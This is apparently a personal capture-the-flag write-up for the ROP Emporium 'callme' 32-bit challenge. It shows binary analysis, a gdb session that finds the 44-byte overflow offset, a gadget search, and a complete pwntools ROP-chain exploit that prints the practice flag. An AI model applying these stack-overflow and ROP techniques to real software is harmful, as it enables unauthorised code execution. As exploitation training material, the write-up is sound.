

# analyze
```shell
➜  x86 file ./callme32 
./callme32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3ca5cba17bcd8926f0cda98986ef619c55023b6d, not stripped
➜  x86 checksec ./callme32 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/callme/x86/callme32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    RUNPATH:    '.'
    Stripped:   No
```

You must **call the callme_one(), callme_two() and callme_three() functions in that order**, **each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d** e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) **to print the flag**. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

**IDA**
```c
int pwnme()
{
  char s[40]; // [esp+0h] [ebp-28h] BYREF

  memset(s, 0, 0x20u);
  puts("Hope you read the instructions...\n");
  printf("> ");
  read(0, s, 0x200u);
  return puts("Thank you!");
}

// and 
void __noreturn usefulFunction()    // wrong call order and args
{
  callme_three(4, 5, 6);
  callme_two(4, 5, 6);
  callme_one(4, 5, 6);
  exit(1);
}
```

**calculate offset to ret address**
```shell
gdb-peda$ pattern create 80
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A'
gdb-peda$ r     
Starting program: /home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/callme/x86/callme32 
callme by ROP Emporium
x86

Hope you read the instructions...

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A
Thank you!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xb ('\x0b')
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xf7fb3870 --> 0x0 
ESI: 0xf7fb2000 --> 0x1b2db0 
EDI: 0xf7fb2000 --> 0x1b2db0 
EBP: 0x41304141 ('AA0A')
ESP: 0xffffd070 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A\n")
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xffffd070 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A\n")
0004| 0xffffd074 ("AAGAAcAA2AAHAAdAA3AAIAAeAA4A\n")
0008| 0xffffd078 ("AcAA2AAHAAdAA3AAIAAeAA4A\n")
0012| 0xffffd07c ("2AAHAAdAA3AAIAAeAA4A\n")
0016| 0xffffd080 ("AAdAA3AAIAAeAA4A\n")
0020| 0xffffd084 ("A3AAIAAeAA4A\n")
0024| 0xffffd088 ("IAAeAA4A\n")
0028| 0xffffd08c ("AA4A\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$ pattern offset 0x41414641
0x41414641 found at offset: 44     # padding 44 bytes to ret address
```

**find gadget**

```shell
➜  x86 ROPgadget --binary ./callme32 --only "pop|ret"
Gadgets information
============================================================
0x080487fb : pop ebp ; ret
0x080487f8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080484ad : pop ebx ; ret
0x080487fa : pop edi ; pop ebp ; ret    
0x080487f9 : pop esi ; pop edi ; pop ebp ; ret      # useful
0x08048496 : ret
0x0804861e : ret 0xeac1
```

# exploit

```python
from pwn import *
pipe = process("./callme32", env={"LD_PRELOAD" : "./libcallme32.so"})

call_one = 0x080484F0
call_two = 0x08048550
call_three = 0x080484E0

arg1 = 0xdeadbeef
arg2 = 0xcafebabe
arg3 = 0xd00df00d

stack_adjust = 0x080487f9   # 0x080487f9 : pop esi ; pop edi ; pop ebp ; ret

chain = "A" * 44
chain += p32(call_one)
chain += p32(stack_adjust)
chain += p32(arg1)
chain += p32(arg2)
chain += p32(arg3)

chain += p32(call_two)
chain += p32(stack_adjust)
chain += p32(arg1)
chain += p32(arg2)
chain += p32(arg3)

chain += p32(call_three)
chain += p32(stack_adjust)
chain += p32(arg1)
chain += p32(arg2)
chain += p32(arg3)

print(pipe.recvuntil("> "))
pipe.sendline(chain)
print(pipe.recv())
```

```shell
➜  x86 python ./exp.py
[+] Starting local process './callme32': pid 59455
callme by ROP Emporium
x86

Hope you read the instructions...

> 
[*] Process './callme32' stopped with exit code 0 (pid 59455)
Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```
